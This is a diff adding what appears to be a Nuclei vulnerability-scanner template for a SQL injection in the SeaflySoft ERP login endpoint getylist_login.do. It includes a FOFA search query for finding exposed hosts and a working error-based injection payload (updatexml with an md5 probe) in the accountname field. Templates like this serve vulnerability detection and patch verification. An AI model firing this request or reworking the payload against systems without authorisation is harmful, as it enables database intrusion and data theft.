@@ -1,0 +1,30 @@
+id: SeaflySoft-ERP-getylist_login-sqli
+
+info:
+  name: SeaflySoft ERP getylist_login.do SQL Injection Vulnerability
+  author: linfeng7z
+  severity: critical
+  description: 海翔 ERP getylist_login 存在sql注入
+  metadata:
+    fofa-query: body="checkMacWaitingSecond"
+  tags: dongsheng,sql,seaflysoft,seafly,erp
+
+http:
+  - raw:
+      - |
+        @timeout: 10
+        POST /getylist_login.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        accountname=test' and (updatexml(1,concat(0x7e,({{sqli}}),0x7e),1));--
+
+    payloads:
+      sqli:
+        - "select md5(123456)"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==500 && contains(body, "e10adc3949ba59abbe56e057f20f883") && contains(header, "text/html")'
